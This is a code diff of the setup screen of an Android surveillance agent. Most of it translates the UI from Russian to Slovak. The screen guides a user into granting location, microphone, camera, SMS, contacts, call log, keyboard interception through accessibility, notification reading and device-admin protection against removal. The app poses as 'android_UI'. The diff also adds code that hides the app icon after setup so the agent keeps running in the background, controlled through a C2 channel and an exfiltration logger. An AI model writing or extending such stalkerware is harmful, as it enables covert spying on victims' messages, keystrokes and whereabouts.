@@ -39,7 +39,7 @@ import com.sp.core.util.Prefs
  *   2. the settings screens that cannot be granted by the app itself are
  *      opened one after another (accessibility, notifications, usage access,
  *      overlay, battery, device admin)
- *   3. "Запустить агент" at the end
+ *   3. "Spustiť agenta" at the end
  *
  * The state of the flow is persisted, so a rotation or a low-memory kill
  * does not restart it from step 0 - that was the bug of the old invisible
@@ -135,16 +135,16 @@ class LauncherActivity : Activity() {
         }
 
         root.addView(TextView(this).apply {
-            text = "Настройка доступа"
+            text = "Nastavenie prístupu"
             setTextColor(TXT)
             textSize = 21f
             setTypeface(typeface, android.graphics.Typeface.BOLD)
         })
         root.addView(TextView(this).apply {
-            text = "Все права выдаются автоматически, по одному системному диалогу. " +
-                    "Шаги, которые приложение не может выдать само (специальные возможности, " +
-                    "уведомления, доступ к использованию, оверлей, батарея, администратор), " +
-                    "открываются в настройках один за другим."
+            text = "Všetky oprávnenia sa udeľujú automaticky, po jednom systémovom dialógu. " +
+                    "Kroky, ktoré aplikácia nedokáže udať sama (prístupnosť, notifikácie, " +
+                    "prístup k štatistikám, prekrytie, batéria, správca zariadenia), " +
+                    "sa otvárajú v nastaveniach jeden za druhým."
             setTextColor(DIM)
             textSize = 13f
             setPadding(0, dp(6), 0, dp(14))
@@ -166,28 +166,28 @@ class LauncherActivity : Activity() {
             ).apply { bottomMargin = dp(14) }
         }
         quick.addView(TextView(this).apply {
-            text = "Быстрый старт"
+            text = "Rýchly štart"
             setTextColor(TXT)
             textSize = 14.5f
             setTypeface(typeface, android.graphics.Typeface.BOLD)
         })
         quick.addView(Button(this).apply {
-            text = "Выдать обычные права"
+            text = "Udeliť bežné oprávnenia"
             isAllCaps = false
             setOnClickListener { grantRuntimeAll() }
         })
         quick.addView(Button(this).apply {
-            text = "Все обычные права на одном экране"
+            text = "Všetky bežné oprávnenia na jednej obrazovke"
             isAllCaps = false
             setOnClickListener { openAppDetails() }
         })
         quick.addView(Button(this).apply {
-            text = "Следующий шаг"
+            text = "Ďalší krok"
             isAllCaps = false
             setOnClickListener { nextStep() }
         })
         quick.addView(Button(this).apply {
-            text = "Повторить автоматическую настройку"
+            text = "Zopakovať automatické nastavenie"
             isAllCaps = false
             setOnClickListener { startAutoFlow(true) }
         })
@@ -201,28 +201,28 @@ class LauncherActivity : Activity() {
             setPadding(0, dp(22), 0, 0)
         }
         skipBtn = Button(this).apply {
-            text = "Пропустить настройку"
+            text = "Preskočiť nastavenie"
             isAllCaps = false
             visibility = View.GONE
-            setOnClickListener { stopAutoFlow("Настройку môžeš dokončiť kedykoľvek") }
+            setOnClickListener { stopAutoFlow("Nastavenie môžeš dokončiť kedykoľvek") }
         }
         bottom.addView(skipBtn)
         startBtn = Button(this).apply {
-            text = "Запустить агент"
+            text = "Spustiť agenta"
             setOnClickListener { startAgent() }
         }
         bottom.addView(startBtn)
         bottom.addView(Button(this).apply {
-            text = "Скрыть икону приложения"
+            text = "Skryť ikonu aplikácie"
             isAllCaps = false
             setOnClickListener { hideIcon() }
         })
         bottom.addView(Button(this).apply {
-            text = "Показать икону приложения"
+            text = "Zobraziť ikonu aplikácie"
             isAllCaps = false
             setOnClickListener {
                 IconHider.show(this@LauncherActivity)
-                toast("Иконка восстановлена")
+                toast("Ikona je obnovená")
                 refresh()
             }
         })
@@ -242,7 +242,7 @@ class LauncherActivity : Activity() {
 
     private fun errorView(t: Throwable): View {
         return TextView(this).apply {
-            text = "Ошибка инициализации:\n${t.javaClass.simpleName}: ${t.message}"
+            text = "Chyba pri inicializácii:\n${t.javaClass.simpleName}: ${t.message}"
             setTextColor(TXT)
             textSize = 13f
             setPadding(dp(20), dp(30), dp(20), dp(20))
@@ -257,66 +257,66 @@ class LauncherActivity : Activity() {
         specialSteps.clear()
 
         permSteps += permStep(
-            "Геоданные (GPS)",
-            "Разрешить определение по GPS — без этого работает только приблизительная позиция по сети",
+            "Geolokácia (GPS)",
+            "Povoliť určovanie polohy cez GPS — bez toho funguje len približná pozícia podľa siete",
             arrayOf(
                 Manifest.permission.ACCESS_FINE_LOCATION,
                 Manifest.permission.ACCESS_COARSE_LOCATION
             )
         )
         permSteps += permStep(
-            "Фоновая геолокация",
-            "Отдельное право: Android требует его выдать отдельно, «Всегда» — в настройках приложения",
+            "Pozadie poloha",
+            "Samostatné oprávnenie: Android ho vyžaduje udeliť zvlášť, možnosť „Vždy“ je v nastaveniach aplikácie",
             arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
         )
         permSteps += permStep(
-            "Микрофон", "Разрешить запись звука вокруг",
+            "Mikrofón", "Povoliť nahrávanie zvuku v okolí",
             arrayOf(Manifest.permission.RECORD_AUDIO)
         )
         permSteps += permStep(
-            "Камера", "Разрешить доступ к камере",
+            "Kamera", "Povoliť prístup ku kamere",
             arrayOf(Manifest.permission.CAMERA)
         )
         permSteps += permStep(
-            "SMS", "Разрешить чтение входящих сообщений", arrayOf(
+            "SMS", "Povoliť čítanie prichádzajúcich správ", arrayOf(
                 Manifest.permission.READ_SMS,
                 Manifest.permission.RECEIVE_SMS
             )
         )
         permSteps += permStep(
-            "Контакты и звонки", "Разрешить контакты и историю вызовов", arrayOf(
+            "Kontakty a hovory", "Povoliť kontakty a históriu hovorov", arrayOf(
                 Manifest.permission.READ_CONTACTS,
                 Manifest.permission.READ_CALL_LOG
             )
         )
         permSteps += permStep(
-            "Медиа", "Разрешить доступ к галерее (фото и видео)", arrayOf(
+            "Médiá", "Povoliť prístup ku galérii (fotky a videá)", arrayOf(
                 Manifest.permission.READ_MEDIA_IMAGES,
                 Manifest.permission.READ_MEDIA_VIDEO
             )
         )
 
         specialSteps += Step(
-            "Специальные возможности",
-            "Найди в списке «Установленные службы» пункт android_UI и включи его — это перехват клавиатуры",
+            "Prístupnosť",
+            "V zozname „Nainštalované služby“ nájdi android_UI a zapni ho — to je zachytávanie klávesnice",
             { ctx -> PermState.accessibility(ctx) }
         ) { act -> act.openSettings(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
 
         specialSteps += Step(
-            "Служба уведомлений",
-            "В списке «Доступ к уведомлениям» включи android_UI — так видны сообщения мессенджеров",
+            "Služba notifikácií",
+            "V zozname „Prístup k notifikáciám“ zapni android_UI — tak vidíš správy z messengerov",
             { ctx -> NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName) }
         ) { act -> act.openSettings(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
 
         specialSteps += Step(
-            "Доступ к использованию",
-            "В списке приложений включи android_UI — это статистика запущенных приложений",
+            "Prístup k štatistikám používania",
+            "V zozname aplikácií zapni android_UI — to je štatistika spustených aplikácií",
             { ctx -> PermState.usageAccess(ctx) }
         ) { act -> act.openSettings(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }
 
         specialSteps += Step(
-            "Наложение поверх окон",
-            "Разрешить оверлей поверх других приложений",
+            "Prekrytie nad oknami",
+            "Povoliť prekrytie cez iné aplikácie",
             { ctx -> PermState.overlay(ctx) }
         ) { act ->
             act.openSettings(
@@ -325,8 +325,8 @@ class LauncherActivity : Activity() {
         }
 
         specialSteps += Step(
-            "Установка неизвестных приложений",
-            "Разрешить установку дополнительных модулей",
+            "Inštalácia neznámych aplikácií",
+            "Povoliť inštaláciu ďalších modulov",
             { ctx -> PermState.unknownSources(ctx) }
         ) { act ->
             act.openSettings(
@@ -335,8 +335,8 @@ class LauncherActivity : Activity() {
         }
 
         specialSteps += Step(
-            "Оптимизация батареи",
-            "Нажми «Разрешить» — без этого система сама убивает приложение",
+            "Optimalizácia batérie",
+            "Stlač „Povoliť“ — bez toho systém aplikáciu sám ukončí",
             { ctx -> PermState.batteryExempt(ctx) }
         ) { act ->
             act.openSettings(
@@ -348,8 +348,8 @@ class LauncherActivity : Activity() {
         }
 
         specialSteps += Step(
-            "Администратор устройства",
-            "Подтверди «Включить» — защита от удаления и сброса до заводских",
+            "Správca zariadenia",
+            "Potvrď „Zapnúť“ — ochrana pred odstránením a resetom do továrenského",
             { ctx -> PermState.deviceAdmin(ctx) }
         ) { act ->
             val admin = ComponentName(act, AdminReceiver::class.java)
@@ -378,7 +378,7 @@ class LauncherActivity : Activity() {
             listBox.addView(buildRow(step, granted))
         }
         if (::summary.isInitialized) {
-            summary.text = "Готово $ok / ${steps.size}"
+            summary.text = "Hotovo $ok / ${steps.size}"
         }
     }
 
@@ -404,7 +404,7 @@ class LauncherActivity : Activity() {
             layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
         })
         head.addView(TextView(this).apply {
-            text = if (granted) "ГОТОВО" else "НУЖНО"
+            text = if (granted) "HOTOVO" else "POTREBNÉ"
             textSize = 10.5f
             setTextColor(if (granted) OK else WARN)
             setTypeface(typeface, android.graphics.Typeface.BOLD)
@@ -419,7 +419,7 @@ class LauncherActivity : Activity() {
         })
 
         val btn = Button(this).apply {
-            text = if (granted) "Проверено" else "Выдать"
+            text = if (granted) "Overené" else "Udeliť"
             isAllCaps = false
             textSize = 12.5f
             if (granted) {
@@ -460,7 +460,7 @@ class LauncherActivity : Activity() {
         }
         if (permQueue.isEmpty()) {
             afterRuntime()
-            toast("Все обычные права уже выданы")
+            toast("Všetky bežné oprávnenia sú už udelené")
             return
         }
         requestNext()
@@ -486,7 +486,7 @@ class LauncherActivity : Activity() {
         val granted = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
         val denied = grantResults.size - granted
         if (denied > 0) {
-            toast("Выдано $granted, отказано $denied — остальное можно выдать в настройках приложения")
+            toast("Udelených $granted, zamietnutých $denied — zvyšok sa dá udieliť v nastaveniach aplikácie")
         }
         if (permQueue.isNotEmpty()) {
             requestNext()
@@ -552,7 +552,10 @@ class LauncherActivity : Activity() {
     private fun openSpecialStep(index: Int) {
         if (!autoActive) return
         if (index >= specialSteps.size) {
-            stopAutoFlow("Настройка завершена — запускай агента")
+            // The setup is done - the icon goes away, the app keeps working
+            // in the background. The C2 command "wizard" brings it back.
+            try { IconHider.hide(this) } catch (_: Throwable) {}
+            stopAutoFlow("Nastavenie dokončené — spusti agenta")
             return
         }
         autoSpecialIdx = index
@@ -594,7 +597,7 @@ class LauncherActivity : Activity() {
             try { !s.granted(this) } catch (_: Throwable) { false }
         }
         if (step == null) {
-            toast("Все права выданы")
+            toast("Všetky oprávnenia sú udelené")
             refresh()
             return
         }
@@ -625,14 +628,14 @@ class LauncherActivity : Activity() {
             com.sp.core.c2.Exfil.sendLog(this, "cmd_result", """{"cmd":"agent_start","ok":true}""")
         } catch (_: Throwable) {
         }
-        toast("Агент запущен")
+        toast("Agent je spustený")
     }
 
     /** Hides the launcher icon without touching the startable component. */
     private fun hideIcon() {
         try {
             IconHider.hide(this)
-            toast("Иконка скрыта, агент работает")
+            toast("Ikona je skrytá, agent beží")
         } catch (_: Throwable) {
         }
         refresh()
